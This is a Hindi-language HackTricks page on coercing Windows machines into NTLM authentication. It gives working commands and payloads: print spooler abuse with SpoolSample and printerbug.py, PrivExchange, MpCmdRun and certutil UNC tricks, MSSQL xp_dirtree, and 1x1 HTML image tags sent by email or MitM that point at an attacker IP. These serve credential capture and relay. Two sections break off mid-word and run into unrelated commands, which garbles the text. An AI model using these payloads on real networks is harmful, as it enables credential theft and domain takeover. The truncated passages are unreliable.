# Force NTLM विशेषाधिकार प्रमाणीकरण

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करना चाहते हैं? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर फॉलो करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**।**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में PR जमा करके।**

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) एक **संग्रह** है जिसमें **रिमोट प्रमाणीकरण ट्रिगर** हैं जो MIDL कंपाइलर का उपयोग करके C# में कोड किए गए हैं ताकि 3rd पार्टी निर्भरता से बचा जा सके।

## Spooler Service Abuse

यदि _**प्रिंट स्पूलर**_ सेवा **सक्रिय** है, तो आप AD क्रेडेंशियल का उपयोग करके डोमेन कंट्रोलर के प्रिंट सर्वर से नए प्रिंट जॉब्स पर **अपड
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### स्पूलर सेवाएं सुन रही हैं

एक थोड़ा सा संशोधित @mysmartlogin's (विन्सेंट ले टूक्स) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) का उपयोग करके देखें कि क्या स्पूलर सेवा सुन रही है:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
आप लिनक्स पर rpcdump.py का उपयोग कर सकते हैं और MS-RPRN Protocol के लिए खोज कर सकते हैं।
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### किसी भी होस्ट के खिलाफ सेवा से प्रमाणीकरण करने के लिए सेवा से अनुरोध करें

आप यहाँ से [**SpoolSample को कंपाइल कर सकते हैं**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**।**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
या [**3xocyte का dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) या [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) का उपयोग करें अगर आप Linux पर हैं।
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### अनियंत्रित अनुमंडलन के साथ संयोजन

यदि किसी हमलावर ने पहले से ही [अनियंत्रित अनुमंडलन](unconstrained-delegation.md) के साथ किसी कंप्यूटर को कंप्रमाइज कर लिया है, तो हमलावर **प्रिंटर को इस कंप्यूटर के खिलाफ प्रमाणीकरण करने** के लिए सक्षम हो सकता है। अनियंत्रित अनुमंडलन के कारण, **प्रिंटर के कंप्यूटर खाते का TGT** अनियंत्रित अनुमंडलन वाले कंप्यूटर की मेमोरी में **सहेजा जाएगा**। क्योंकि हमलावर ने पहले से ही इस होस्ट को कंप्रमाइज कर लिया है, वह **इस टिकट को पुनः प्राप्त** कर सकेगा और इसका दुरुपयोग कर सकेगा ([टिकट पास](pass-the-ticket.md))।

## RCP बल प्रमाणीकरण

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` हमला एक दोष का परिणाम है जो **एक्सचेंज सर्वर `PushSubscription` विशेषता** में पाया गया है। यह विशेषता एक्सचेंज सर्वर को किसी भी डोमेन उपयोगकर्ता द्वारा बाधित करने की अनुमति देती है ताकि वह HTTP के माध्यम से किसी भी क्लाइंट द्वारा प्रदान किए गए होस्ट को प्रमाणीकृत कर सके।

डिफ़ॉल्ट रूप से, **एक्सचेंज सेवा SYSTEM के रूप में चलती है** और इसे अत्यधिक अधिकार (विशेष रूप से, **डोमेन पूर्व-2019 संचयी अपड
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
या इस दूसरी तकनीक का उपयोग करें: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Certutil.exe lolbin (Microsoft-signed binary) का उपयोग करके NTLM प्रमाणीकरण को बलपूर्वक करना संभव है:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML इन्जेक्शन

### ईमेल के माध्यम से

यदि आपके पास उस उपयोगकर्ता का **ईमेल पता** है जो आपके द्वारा कंप्रोमाइज़ करना चाहते हैं, तो आप उसे एक **1x1 छवि के साथ ईमेल** भेज सकते हैं जैसे कि
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

यदि आप किसी कंप्यूटर पर MitM हमला कर सकते हैं और उस पेज में HTML इंजेक्ट कर सकते हैं जिसे वह देखेगा, तो आप पेज में निम्नलिखित तरह की छवि इंजेक्ट करने की कोशिश कर सकते हैं:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 क्रैकिंग

अगर आप [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack) को कैप्चर कर सकते हैं।\
_ध्यान रखें कि NTLMv1 को क्रैक करने के लिए आपको रिस्पॉंडर चैलेंज को "1122334455667788" पर सेट करना होगा_
